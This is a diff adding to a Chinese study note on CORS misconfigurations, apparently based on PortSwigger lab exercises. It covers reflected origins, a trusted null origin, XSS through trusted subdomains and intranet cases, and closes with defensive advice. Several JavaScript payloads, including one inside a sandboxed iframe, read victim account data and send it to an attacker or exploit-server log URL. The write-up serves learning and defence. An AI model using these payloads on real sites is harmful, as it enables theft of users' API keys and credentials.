@@ -101,3 +101,144 @@ Access-Control-Max-Age 可选 本次预检的有效期，单位：秒；
 4、响应里包含管理员的 API key。
 
 5、脚本再把这个 key 发给攻击者的服务器
+
+## 服务器根据客户端指定的 Origin 标头生成 ACAO 标头
+
+某些应用需要提供对其他多个域的访问权限，因此，某些应用程序选择了一种简单的方法，即有效地允许来自任何其他域的访问。
+
+一种方法是读取请求中的 Origin 标头，并在响应标头中添加一个声明，表明该请求源是被允许的。
+
+即：请求中包含：
+
+```
+Origin: https://malicious-website.com
+```
+
+响应包中包含：
+
+```
+Access-Control-Allow-Origin: https://malicious-website.com
+```
+
+由于该应用程序在 `Access-Control-Allow-Origin` 标头中反映了任意来源，这意味着任何域都可以访问来自易受攻击域的资源。如果响应包含任何敏感信息，例如 API 密钥或 CSRF 令牌，您可以通过在您的网站上放置以下脚本来检索这些信息：
+
+```
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//malicious-website.com/log?key='+this.responseText;
+};
+```
+
+## 具有可信空源的 CORS 漏洞
+
+![image-20250822164441395](assets/image-20250822164441395.png)
+
+说明服务器的CORS策略信任null源
+
+在攻击服务器：
+
+```js
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest(); //用于在不刷新页面的情况下向服务器发送 HTTP 请求
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() { //当服务器响应请求时，会触发 reqListener 函数
+        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
+
+使用iframe是因为它当中发送出去的origin请求头是null
+
+## 通过 CORS 信任关系利用 XSS
+
+给出以下请求：
+
+```
+GET /api/requestApiKey HTTP/1.1 
+Host: vulnerable-website.com 
+Origin: https://subdomain.vulnerable-website.com 
+Cookie: sessionid=...
+```
+
+如果服务器响应：
+
+```
+HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
+Access-Control-Allow-Credentials: true
+```
+
+然后，在 `subdomain.vulnerable-website.com` 上发现 XSS 漏洞的攻击者可以使用它来检索 API 密钥，使用如下 URL：
+
+```
+https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+```
+
+### 靶场：
+
+网站的CORS策略支持子域名：
+
+![image-20250822171152505](assets/image-20250822171152505.png)
+
+在商品页面上点击查看库存按钮，可以看到它是使用子域名上的HTTP URL加载的
+
+![image-20250822171328953](assets/image-20250822171328953.png)
+
+又发现这个productId参数可能存在XSS
+
+![image-20250822171412080](assets/image-20250822171412080.png)
+
+验证一下的确有：
+
+![image-20250822171616773](assets/image-20250822171616773.png)
+
+在漏洞服务器中输入一下HTML：
+
+```html
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
+## 无需凭证的 Intranet 和 CORS
+
+大多数 CORS 攻击依赖于响应标头的存在：
+
+```
+Access-Control-Allow-Credentials: true
+```
+
+如果没有该标头，受害者用户的浏览器将拒绝发送他们的 cookie，这意味着攻击者只能访问未经身份验证的内容，他们可以通过直接浏览目标网站轻松访问这些内容。
+
+然而，有一种常见情况是攻击者无法直接访问某个网站：当该网站位于组织内部网中，且位于私有 IP 地址空间内时。内部网站的安全标准通常低于外部网站，这使得攻击者能够找到漏洞并获得进一步的访问权限。例如，私有网络内的跨域请求可能如下所示：
+
+```
+GET /reader?url=doc1.pdf 
+Host: intranet.normal-website.com
+Origin: https://normal-website.com
+```
+
+服务器响应如下：
+
+```
+HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: *
+```
+
+## 如何防御CORS漏洞
+
+如果 Web 资源包含敏感信息，则应在 `Access-Control-Allow-Origin` 标头中正确指定来源。
+
+避免使用标头 `Access-Control-Allow-Origin: null` 。来自内部文档和沙盒请求的跨域资源调用可以指定 `null` 源。CORS 标头应针对私有服务器和公共服务器的可信来源进行正确定义。
+
+避免在内部网络中使用通配符。
+
+CORS 定义了浏览器的行为，但它永远无法取代服务器端对敏感数据的保护——攻击者可以直接伪造来自任何受信任来源的请求。因此，除了正确配置 CORS 之外，Web 服务器还应继续对敏感数据（例如身份验证和会话管理）实施保护。
